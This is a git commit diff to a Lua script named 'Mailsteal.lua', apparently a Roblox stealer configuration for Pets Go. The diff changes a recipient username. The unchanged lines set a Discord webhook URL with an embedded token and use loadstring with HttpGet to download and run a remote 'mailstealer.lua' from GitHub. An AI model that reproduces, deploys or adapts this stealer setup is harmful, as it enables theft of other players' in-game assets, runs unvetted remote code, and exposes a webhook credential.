d6f9856f4a78c9c4d8f70c48dda2b2bf12334801
shanelltemariogamin <hedrixtemariogaming@gmail.com>
2024-10-20 12:54:28 +0800

    Mailsteal.lua

--- Mailsteal.lua
+++ Mailsteal.lua
@@ -1,6 +1,6 @@
 Usernames = {
     "shanelltemariogamin",
-    "Noobrix15",
+    "user2",
     "user3",
     -- "user4",
     -- "user5",
@@ -10,4 +10,3 @@ min_chance = 100000
 webhook = "https://discord.com/api/webhooks/1297418660234919957/7FVIAyHM6F-OyqwaAeIf5rGwvF-7MbMLJRKUCbfXs3ixwtGisNZKsgE4yKG9prAkjyuM"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/Pets-Go/refs/heads/main/mailstealer.lua"))()
-```
